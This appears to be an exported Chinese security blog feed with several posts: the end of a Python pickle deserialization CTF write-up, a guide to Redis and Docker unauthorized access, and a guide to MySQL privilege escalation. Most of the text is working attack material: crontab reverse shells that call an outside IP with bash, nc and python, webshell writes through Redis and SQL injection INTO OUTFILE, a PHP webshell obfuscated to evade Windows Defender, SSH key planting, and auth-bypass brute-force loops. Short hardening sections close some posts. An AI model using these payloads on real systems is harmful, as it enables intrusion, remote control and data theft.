class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">29935</span>))</span><br><span class="line">exp = <span class="string">b&#x27;&#x27;&#x27;cguess_game</span></span><br><span class="line"><span class="string">game</span></span><br><span class="line"><span class="string">&#125;S&quot;win_count&quot;</span></span><br><span class="line"><span class="string">I10</span></span><br><span class="line"><span class="string">sS&quot;round_count&quot;</span></span><br><span class="line"><span class="string">I10</span></span><br><span class="line"><span class="string">sbcguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x03sb.&#x27;&#x27;&#x27;</span></span><br><span class="line">s.send(struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, len(exp)))</span><br><span class="line">s.send(exp)</span><br><span class="line">print(s.recv(<span class="number">1024</span>))</span><br><span class="line">print(s.recv(<span class="number">1024</span>))</span><br><span class="line">print(s.recv(<span class="number">1024</span>))</span><br><span class="line">print(s.recv(<span class="number">1024</span>))</span><br></pre></td></tr></table></figure><p>分析一下构造过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cguess_game</span><br><span class="line">game<span class="comment"># 引入guess_game.game类</span></span><br><span class="line">&#125;S<span class="string">&#x27;round_count&#x27;</span><span class="comment"># push一个空的字典，把round_count和win_count加到里面</span></span><br><span class="line">I10</span><br><span class="line">sS<span class="string">&#x27;win_count&#x27;</span></span><br><span class="line">I10</span><br><span class="line">sbcguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\xffsb.</span><br></pre></td></tr></table></figure><p>最后一行前两个字母表示对象更新，后面一串是guess_game.Ticket对象序列化的结果，<code>pickle</code> 序列流执行完后会把栈顶的值返回，那结尾再留一个 <code>Ticket</code> 的对象就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> guess_game.Ticket <span class="keyword">import</span> Ticket</span><br><span class="line"><span class="keyword">from</span> guess_game.Game <span class="keyword">import</span> Game</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">exp = <span class="string">b&#x27;&#x27;&#x27;cguess_game</span></span><br><span class="line"><span class="string">game</span></span><br><span class="line"><span class="string">&#125;S&quot;win_count&quot;</span></span><br><span class="line"><span class="string">I10</span></span><br><span class="line"><span class="string">sS&quot;round_count&quot;</span></span><br><span class="line"><span class="string">I10</span></span><br><span class="line"><span class="string">sb\x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x03sb.&#x27;&#x27;&#x27;</span></span><br><span class="line">exp1 = <span class="string">b&#x27;&#x27;&#x27;cguess_game</span></span><br><span class="line"><span class="string">game</span></span><br><span class="line"><span class="string">&#125;S&quot;win_count&quot;</span></span><br><span class="line"><span class="string">I10</span></span><br><span class="line"><span class="string">sS&quot;round_count&quot;</span></span><br><span class="line"><span class="string">I10</span></span><br><span class="line"><span class="string">sb.&#x27;&#x27;&#x27;</span></span><br><span class="line">a=Ticket(<span class="number">3</span>)</span><br><span class="line">print(pickle.dumps(a))</span><br><span class="line"><span class="comment"># b&#x27;\x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x03sb.&#x27;</span></span><br><span class="line">b=pickle.loads(exp)</span><br><span class="line">print(b)</span><br><span class="line"><span class="comment"># &lt;guess_game.Ticket.Ticket object at 0x7f9370b61a90&gt;</span></span><br><span class="line">print(b.__dict__)</span><br><span class="line"><span class="comment"># &#123;&#x27;number&#x27;: 3&#125;</span></span><br><span class="line">c=pickle.loads(exp1)</span><br><span class="line">print(c)</span><br><span class="line"><span class="comment"># &lt;guess_game.Game.Game object at 0x7f9370b50eb8&gt;</span></span><br><span class="line">print(c.__dict__)</span><br><span class="line"><span class="comment"># &#123;&#x27;win_count&#x27;: 10, &#x27;curr_ticket&#x27;: &lt;guess_game.Ticket.Ticket object at 0x7f9370b50f60&gt;, &#x27;round_count&#x27;: 10&#125;</span></span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://www.xjimmy.com/python-36-serialization.html">https://www.xjimmy.com/python-36-serialization.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/89132768">https://zhuanlan.zhihu.com/p/89132768</a></p><p><a href="https://www.anquanke.com/post/id/188981">https://www.anquanke.com/post/id/188981</a></p><p><a href="http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>未授权访问总结</title>
      <link href="2020/04/05/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/"/>
      <url>2020/04/05/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了未授权访问的相关内容！</p><a id="more"></a><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>未授权访问漏洞可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷导致其他用户可以直接访问从而引发重要权限可被操作、数据库或网站目录等敏感信息泄露。</p><h2 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>Redis 是一个高性能的 Key – Value 数据库。Redis 的出现很大程度上弥补了 memcached 这类 Key/Value 存储的不足在部分场合可以对关系数据库起到很好的补充作用。</p><p>Redis 默认情况下会绑定在 <code>0.0.0.0:6379</code>，这样会将 Redis 服务暴露到公网上。在没有开启认证的情况下会导致任意用户在可以访问目标服务器的情况下未经授权就访问到 Redis 以及读取 Redis 的数据。</p><p>攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法成功地在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。</p><p>Redis未授权访问在4.x/5.0.5以前版本下，我们可以使用master/slave模式加载远程模块，通过动态链接库的方式执行任意命令。</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>这里直接用vulhub搭一下环境，搭建好用namp扫下,查看一下Redis的详细信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p 6379 --script redis-info 47.97.210.141</span><br></pre></td></tr></table></figure><img src="/2020/04/05/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIM截图20200403214810.png" style="zoom: 80%;"><p>由于目标环境没有开启认证(空密码)，我们可以直接登陆进去</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 47.97.210.141 -p 6379</span><br></pre></td></tr></table></figure><img src="/2020/04/05/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIM截图20200403230731.png" style="zoom:80%;"><p>常见的Redis命令(不区分大小写)：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ping <span class="comment">#查看redis启动状态，返回PONG为正常</span></span><br><span class="line">key  * 　　<span class="comment">#查看redis中的所有键</span></span><br><span class="line">exists  key 　　 <span class="comment">#判断一个键是否存在，存在返回1，否则返回0</span></span><br><span class="line">del  key  [key...] 　　 <span class="comment">#删除一个或多个键，返回删除的键的个数</span></span><br><span class="line">type  key 　　 <span class="comment">#获得键值的数据类型</span></span><br><span class="line">set  key  value　　<span class="comment">#给键赋值</span></span><br><span class="line">mset  key1  v1  key2  v2  key3  v3　　<span class="comment">#同时给多个键赋值</span></span><br><span class="line">get  key　　<span class="comment">#取值</span></span><br><span class="line">mget  key1  key2  key3　　<span class="comment">#同时获取多个键值</span></span><br><span class="line">append  key  value　　<span class="comment">#在字符串后面追加值，如果该键不存在即为为这个键赋值（该命令第二个参数需要加引号，因为有可能追加空格，所以要引起来）</span></span><br><span class="line">strlen  key　　<span class="comment">#返回键值的长度，如果不存在返回0</span></span><br><span class="line">config<span class="comment">#获取和设置配置</span></span><br></pre></td></tr></table></figure><h4 id="网站写马"><a href="#网站写马" class="headerlink" title="网站写马"></a>网站写马</h4><p>如果目标服务开的有web服务,并且对应目录有写的权限，我们可以试着往网站目录写一个webshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /var/www/html/</span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="built_in">set</span> x <span class="string">&quot;&lt;?php @eval(<span class="variable">$_POST</span>[1]);?&gt;&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><img src="/2020/04/05/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIM截图20200403235951.png" style="zoom:80%;"><p>如果网站目录没有写权限，我们可以在<code>/tmp</code>里写，然后找文件包含之类的漏洞</p><p>真实环境的Redis数据库会很大，我们直接save的话会保存一个很大的文件，而且里面不免有影响webshell正常执行的因素，因此一个比较好的思路就是将Redis保存的文件作为中间文件，再用这个中间文件来写shell，并且从备份的文件里找到一个靠前的键，把shell写入值里，可以构造类似：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_time_limit(<span class="number">0</span>);<span class="comment">//取消执行时间限制</span></span><br><span class="line">$fp=fopen(<span class="string">&#x27;wtf.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite($fp,<span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当然没有顾虑的话也可以直接用<code>flushall</code>删库跑路</p><h4 id="结合SSH免密码登录"><a href="#结合SSH免密码登录" class="headerlink" title="结合SSH免密码登录"></a>结合SSH免密码登录</h4><p>如果Redis使用root用户启动，并且开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</p><p>在kali <code>/root/.ssh</code>目录下执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; foo.txt</span><br><span class="line">cat foo.txt | redis-cli -h 47.97.210.141 -p 9997 -x <span class="built_in">set</span> crackit</span><br><span class="line">redis-cli -h 47.97.210.141 -p 9997</span><br><span class="line">config <span class="built_in">set</span> dir /root/.ssh/</span><br><span class="line">config <span class="built_in">set</span> dbfilename <span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>这里直接用github上大佬的exp：<a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p><p>exp.so可以从这里获得：<a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rce.py -r 47.97.210.141 -p 9997 -L 47.97.210.141 -f exp.so</span><br></pre></td></tr></table></figure><img src="/2020/04/05/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIM截图20200404180709.png" style="zoom:80%;"><h4 id="计划任务反弹shell"><a href="#计划任务反弹shell" class="headerlink" title="计划任务反弹shell"></a>计划任务反弹shell</h4><p>Redis以root权限运行时可以写crontab来执行命令反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 47.97.210.141 -p 9997</span><br><span class="line"><span class="built_in">set</span> x <span class="string">&quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/47.97.210.141/4444 0&gt;&amp;1\n&quot;</span></span><br><span class="line">config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h3 id="防护手段"><a href="#防护手段" class="headerlink" title="防护手段"></a>防护手段</h3><p>修改<code>redis.conf</code>监听本机地址<code>127.0.0.1</code></p><p>修改<code>redis.conf</code>添加<code>requirepass mypassword</code>设置认证</p><p>修改 redis.conf 文件，禁用远程修改 DB 文件地址</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename-command FLUSHALL <span class="string">&quot;&quot;</span></span><br><span class="line">rename-command CONFIG   <span class="string">&quot;&quot;</span></span><br><span class="line">rename-command <span class="keyword">EVAL</span>     <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>以低权限运行 Redis 服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure><p>iptables</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// accept</span><br><span class="line"><span class="comment">## iptables -A INPUT -p tcp -s 127.0.0.1 --dport 6379 -j ACCEPT</span></span><br><span class="line"><span class="comment">## iptables -A INPUT -p udp -s 127.0.0.1 --dport 6379 -j ACCEPT</span></span><br><span class="line"></span><br><span class="line">// drop</span><br><span class="line"><span class="comment">## iptables -I INPUT -p tcp --dport 6379 -j DROP</span></span><br><span class="line"><span class="comment">## iptables -I INPUT -p udp --dport 6379 -j DROP</span></span><br><span class="line"></span><br><span class="line">// 保存规则并重启 iptables</span><br><span class="line"><span class="comment">## service iptables save</span></span><br><span class="line"><span class="comment">## service iptables restart</span></span><br></pre></td></tr></table></figure><h2 id="Docker未授权访问"><a href="#Docker未授权访问" class="headerlink" title="Docker未授权访问"></a>Docker未授权访问</h2><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>Docker 是一个开源的引擎可以轻松地为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署包括 VMs、bare metal、OpenStack 集群和其他的基础应用平台Docker。</p><p>Docker Remote API 是一个取代远程命令行界面（rcli）的REST API，监听在<code>0.0.0.0:2375</code>。存在问题的版本分别为 1.3 和 1.6因为权限控制等问题导致可以通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建 container，删除已有 container，甚至是获取宿主机的 shell。</p><h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>还是用Vulhub上的</p><p><img src="/2020/04/05/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIM%E6%88%AA%E5%9B%BE20200405124115.png"></p><p>访问<code>/version</code>可以看到版本信息</p><p>也可以直接用docker命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://47.97.210.141:9375 version</span><br></pre></td></tr></table></figure><img src="/2020/04/05/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIM截图20200405184112.png" style="zoom:80%;"><p>同样我们可以执行其它命令</p><h4 id="计划任务反弹shell-1"><a href="#计划任务反弹shell-1" class="headerlink" title="计划任务反弹shell"></a>计划任务反弹shell</h4><p>随意启动一个镜像，没有的话pull一个，这里用的是基于<code>Alpine Linux</code>的超小型Docker镜像,大小只有几兆</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://47.97.210.141:9375 pull alpine:latest</span><br></pre></td></tr></table></figure><img src="/2020/04/05/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIM截图20200405194440.png" style="zoom:80%;"><p>接着</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动容器</span></span><br><span class="line">docker -H tcp://47.97.210.141:9375 run -id -v /:/tmp alpine:latest</span><br><span class="line"><span class="comment"># 列一下正在运行的容器</span></span><br><span class="line">docker -H tcp://47.97.210.141:29375 ps</span><br><span class="line"><span class="comment"># 进入容器并把/目录挂载到容器的/tmp目录下</span></span><br><span class="line">docker -H tcp://47.97.210.141:9375 <span class="built_in">exec</span> -it 7c99cec3c42a sh</span><br></pre></td></tr></table></figure><img src="/2020/04/05/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIM截图20200405215112.png" style="zoom:80%;"><p>可以看到我们已经成功挂载并可以读取文件了，写后门，然后退出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;* * * * * /usr/bin/nc 47.97.210.141 9000 -e /bin/sh&#x27;</span> &gt;&gt; /tmp/etc/crontabs/root</span><br></pre></td></tr></table></figure><p><img src="/2020/04/05/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIM%E6%88%AA%E5%9B%BE20200405220719.png"></p><p>也可以写入其他的,视环境而定，比如python</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;*/1 * * * * root /usr/bin/python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,8088));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#x27;\n&quot;</span> &gt;&gt; /etc/crontab</span><br></pre></td></tr></table></figure><p>同样，可以将反弹shell的脚本写入写入到<code>/var/spool/cron/root</code>（centos系统）或<code>/var/spool/cron/crontabs/root</code>(ubuntu系统)</p><h4 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h4><p>写ssh公钥和上面方法类似，都是写文件嘛</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>把文件内容放到目标主机<code>/root/.ssh/id_rsa.pub</code>文件里就行了</p><p>github上有个脚本：<a href="https://github.com/Tycx2ry/docker_api_vul">https://github.com/Tycx2ry/docker_api_vul</a></p><p>可以直接执行脚本写计划任务反弹shell等操作</p><h3 id="防护手段-1"><a href="#防护手段-1" class="headerlink" title="防护手段"></a>防护手段</h3><p>在不必需的情况下，不要启用 docker 的 remote api 服务，如果必须使用的话，可以采用如下的加固方式：</p><ol><li>设置 ACL，仅允许信任的来源 IP 连接</li><li>设置 TLS 认证，官方的文档为 Protect the Docker daemon socket</li></ol><p>修改 Docker 的启动参数：<br>定位到 DOCKER_OPTS 中的 tcp://0.0.0.0:2375，将0.0.0.0修改为127.0.0.1，将默认端口 2375 改为自定义端口</p><p>参考：</p><p><a href="https://www.runoob.com/redis/redis-tutorial.html">https://www.runoob.com/redis/redis-tutorial.html</a></p><p><a href="https://www.cnblogs.com/Qsunshine/p/redis.html">https://www.cnblogs.com/Qsunshine/p/redis.html</a></p><p><a href="https://xz.aliyun.com/t/2320">https://xz.aliyun.com/t/2320</a></p><p><a href="https://www.secpulse.com/archives/39440.html">https://www.secpulse.com/archives/39440.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 未授权访问 </tag>
            
            <tag> Redis </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql提权总结</title>
      <link href="2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"/>
      <url>2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了mysql提权的相关内容！</p><a id="more"></a><h2 id="mysql提权简介"><a href="#mysql提权简介" class="headerlink" title="mysql提权简介"></a>mysql提权简介</h2><p>我个人理解的mysql提权就是通过sql注入，爆破mysql用户密码等方式从而让我们可以执行sql语句，在此基础上达到执行命令，获取用户权限等等！</p><h2 id="CVE-2012-2122"><a href="#CVE-2012-2122" class="headerlink" title="CVE-2012-2122"></a>CVE-2012-2122</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>该漏洞是身份认证绕过漏洞，当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>受影响版本：</p><ul><li>MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.</li><li>MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.</li></ul><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>msf里面已经集成了利用模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br><span class="line"><span class="built_in">set</span> rhosts 127.0.0.1</span><br><span class="line"><span class="built_in">set</span> rport 3306</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/TIM截图20200330181301.png" style="zoom:80%;"><p>然后解hash就行，解出来登陆</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -P 9906 -h 127.0.0.1 -p</span><br></pre></td></tr></table></figure><img src="/2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/TIM截图20200330181748.png" style="zoom:80%;"><p>当然爆破登陆的方式不止这一种</p><p><strong>shell脚本：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in `seq 1 1000`; do mysql -u root -h 127.0.0.1 -P 9906 --password=bad 2&gt;/dev/null; done</span><br></pre></td></tr></table></figure><img src="/2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/TIM截图20200330182518.png" style="zoom:80%;"><p><strong>python脚本：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        subprocess.Popen(<span class="string">&quot;mysql -u root -h 47.97.210.171 -P 9906 --password=aaa&quot;</span>, shell=<span class="literal">True</span>).wait()</span><br></pre></td></tr></table></figure><h2 id="利用写shell"><a href="#利用写shell" class="headerlink" title="利用写shell"></a>利用写shell</h2><h3 id="outfile写文件"><a href="#outfile写文件" class="headerlink" title="outfile写文件"></a>outfile写文件</h3><p>该操作需要写文件的目录要有写权限，并且mysql也要有写文件权限，需要进行以下更改参数</p><p> secure_file_priv 参数是只读参数，不能使用 SET GLOBAL 语句修改，只有修改 MySQL 的配置文件并重启 MySQL 才能对此进行修改。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SET GLOBAL secure_file_priv=&#x27;&#x27;;</span><br><span class="line">ERROR 1238 (HY000): Variable &#x27;secure_file_priv&#x27; is a read only variable</span><br></pre></td></tr></table></figure><p>修改mysql.ini 文件，在[mysqld] 下添加条目: <code>secure_file_priv =</code></p><p>保存，重启mysql。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">值为null ，也就是注释掉这个参数或者secure_file_priv&#x3D;null。表示限制mysqld 不允许导入|导出</span><br><span class="line">值为&#x2F;tmp&#x2F; ，即secure_file_priv&#x3D;&quot;&#x2F;tmp&#x2F;&quot; 表示限制mysqld 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下</span><br><span class="line">没有具体值时，即secure_file_priv&#x3D;      表示不对mysqld 的导入|导出做限制</span><br></pre></td></tr></table></figure><p>以sqli-labs第一关为例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span><span class="string">&#x27; union select 1,@@basedir,@@datadir%23</span></span><br></pre></td></tr></table></figure><p><code>@@basedir</code>是指Mysql的安装目录，<code>@@datadir</code>是指数据库文件的路径，我们需要用web目录，可以根据以上的信息猜一下</p><img src="/2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/TIM截图20200331200426.png" style="zoom:80%;"><p>然后就可以写马了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; union select 1,2,&#x27;</span><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="number">1</span>]);<span class="meta">?&gt;</span><span class="string">&#x27; into outfile &quot;C:/phpStudy/PHPTutorial/www/moonback.php&quot;%23</span></span><br></pre></td></tr></table></figure><p>这种Windows Defender直接杀了，下面这个可以过Windows Defender</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; union select 1,2,&#x27;</span><span class="meta">&lt;?php</span> array_udiff_assoc(<span class="keyword">array</span>($_REQUEST[<span class="number">1</span>]), <span class="keyword">array</span>(<span class="number">1</span>), <span class="string">&quot;ass&quot;</span>.<span class="string">&quot;ert&quot;</span>);<span class="meta">?&gt;</span><span class="string">&#x27; into outfile 